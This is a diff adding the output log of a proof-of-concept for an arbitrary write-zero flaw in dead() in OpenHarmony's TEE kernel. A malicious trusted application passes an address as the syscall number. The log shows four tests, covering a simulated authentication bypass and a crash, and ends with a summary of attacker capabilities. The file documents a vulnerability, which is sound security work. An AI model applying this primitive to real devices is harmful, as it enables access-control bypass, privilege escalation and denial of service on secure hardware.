@@ -1,0 +1,36 @@
+=== PoC: Arbitrary Write-Zero via dead() (syscall_dispatcher.c:933) ===
+OpenHarmony tee_os_kernel
+
+[Test 1] Write-zero to heap variable via crafted syscall number
+  Before: *target = 0x41414141 (at 0x5c1521d96020)
+  Calling dead() with n = 0x5c1521d96020 (address of target)...
+Unsupported syscall 101245831962656, bye.
+  After:  *target = 0x00000000
+  [VULNERABLE] Successfully wrote zero to arbitrary address!
+
+[Test 2] Overwrite security flag (simulated auth bypass)
+  auth_required = 1 (authentication enforced)
+  Malicious TA passes &auth_required as syscall number...
+Unsupported syscall 140723836264108, bye.
+  auth_required = 0 (authentication BYPASSED!)
+
+[Test 3] DoS via write to unmapped address
+  Calling dead(0xDEAD0000) - unmapped address...
+Unsupported syscall 3735879680, bye.
+  [CRASH] SIGSEGV caught! TEE kernel would panic here.
+  In real hardware: Secure Monitor abort -> device reboot.
+
+[Test 4] Full path: malicious TA -> __syscall6 -> dead()
+  Security token at 0x5c1521d96020 = 0x00FACADE
+  TA invokes syscall with number = 0x5c1521d96020...
+Unsupported syscall 101245831962656, bye.
+  Security token now = 0x00000000
+  [VULNERABLE] Token zeroed via unsupported syscall path!
+
+=== Summary ===
+The dead() function treats the syscall number as a pointer and
+writes zero to it. A malicious TA can:
+  1. Write zero to ANY mapped address in TEE kernel space
+  2. Zero out security flags to bypass access control
+  3. Crash the TEE kernel by targeting unmapped addresses (DoS)
+  4. Corrupt kernel data structures for privilege escalation
